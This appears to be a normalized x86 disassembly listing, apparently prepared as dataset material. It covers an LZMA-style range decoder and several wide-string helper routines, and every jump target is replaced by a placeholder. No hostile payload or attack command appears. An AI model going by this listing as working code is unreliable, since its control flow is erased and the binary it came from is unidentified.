add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x38 ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x54 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x28 ] 0x4
jae r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x48 ]
jb r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
cmp [ ebp - 0x20 ] 0x4
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x64 ] 0x3
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x64 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x64 ]
shl edx 0x6
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x360 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x40
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x1c ] 0x4
jb r-xdata
cmp [ ebp - 0x1c ] 0x40
jb r-xdata
mov eax [ ebp - 0x1c ]
shr eax 0x1
sub eax 0x1
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x1c ] 0xe
jae r-xdata
mov eax [ ebp - 0x2c ]
sub eax 0x4
mov [ ebp - 0x2c ] eax
mov edx [ ebp - 0x1c ]
and edx 0x1
or edx 0x2
mov ecx [ ebp - 0x2c ]
shl edx cl
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x560 ]
mov edx [ ebp - 0x1c ]
shl edx 0x1
sub ecx edx
sub ecx 0x2
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x4 ]
shr edx 0x1f
sub edx 0x1
and edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub eax edx
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x644
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x2c ] 0x4
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x3c ] edx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x3c ]
add eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
shl edx 0x8
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x10 ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x2c ]
sub eax 0x1
mov [ ebp - 0x2c ] eax
jne r-xdata
sub_40b360
push ebp
mov ebp esp
mov eax 0x1
shl eax 0x0
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + eax ]
shl edx 0x18
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x10
or edx eax
mov ecx 0x1
imul ecx ecx 0x3
mov eax [ ebp + 0xc ]
movzx ecx [ eax + ecx ]
shl ecx 0x8
or edx ecx
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x0
pop ebp
retn
sub_40b3d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x48 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x2c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x50 ] 0x1
sub_40b450
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
mov eax 0x300
shl eax cl
add eax 0x736
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov edx 0x4
imul edx edx 0x3
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0x38 ] 0x1
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + ecx + 0x38 ] 0x1
mov eax 0x4
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x38 ] 0x1
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0x38 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x34 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x50 ] 0x0
mov esp ebp
pop ebp
retn
mov edx 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_40b510
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40a680
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4c ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x1
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
cmp ecx [ ebp + 0xc ]
jb r-xdata
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40b450
add esp 0x4
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x5
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x5
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x4 ] 0x14
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x4
xor eax eax
jmp r-xdata
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + eax + 0x5c ]
test edx edx
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov dl [ edx ]
mov [ ecx + eax + 0x5c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x10 ]
add eax 0x1
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x58 ] edx
cmp [ ebp - 0xc ] 0x14
jb r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x4 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a870
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov eax 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x5c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b360
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40a870
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov cl [ eax ]
mov [ edx + 0x5c ] cl
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
push ecx
call sub_424fc0
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
lea eax [ edx + ecx - 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x5c
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
push edx
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40a7a0
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x14
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x14 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x20 ] 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x5c
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx eax
mov eax [ ebp - 0xc ]
sub eax edx
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x1c ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40a7a0
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x2
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x48 ] 0x112
je r-xdata
sub_40b8e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] 0x0
pop ebp
retn
sub_40b910
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x10 ] 0x5
jae r-xdata
mov eax 0x1
shl eax 0x0
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + eax ]
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x8
or edx eax
mov ecx 0x1
imul ecx ecx 0x3
mov eax [ ebp + 0xc ]
movzx ecx [ eax + ecx ]
shl ecx 0x10
or edx ecx
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
shl eax 0x18
or edx eax
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x1000
jae r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0xc ] edx
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0xc ]
mov dl [ ecx + eax ]
mov [ ebp - 0x1 ] dl
movzx eax [ ebp - 0x1 ]
cmp eax 0xe1
jl r-xdata
mov [ ebp - 0x8 ] 0x1000
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x9
idiv ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x5
idiv ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
movzx eax [ ebp - 0x1 ]
cdq
mov ecx 0x5
idiv ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
xor eax eax
mov eax 0x4
jmp r-xdata
sub_40ba00
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
add ecx [ edx + 0x4 ]
mov eax 0x300
shl eax cl
add eax 0x736
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40b8e0
add esp 0x8
mov eax [ ebp - 0x4 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x54 ]
je r-xdata
xor eax eax
mov eax 0x2
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40ba80
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
call sub_40b910
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40ba00
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
xor eax eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_40bb00
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp + 0x10 ] ecx
pop ebp
retn
sub_40bb40
push ebp
mov ebp esp
push ecx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
cmp ecx eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
cmp edx ecx
jge r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x2
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
jmp r-xdata
sub_40bbb0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_424fc0
add esp 0xc
pop ebp
retn
sub_40bbd0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
shl eax 0x1
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_421ef0
add esp 0xc
pop ebp
retn
sub_40bbf0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40bb40
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40bc30
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov dx [ ecx ]
mov [ ebp - 0x2 ] dx
add [ ebp - 0x8 ] 0x2
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
sar eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40bc90
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bbb0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40bcc0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
movzx edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bb00
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40bd00
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bbd0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40bd50
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40c030
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40bd80
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40c030
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40bee0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40be00
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
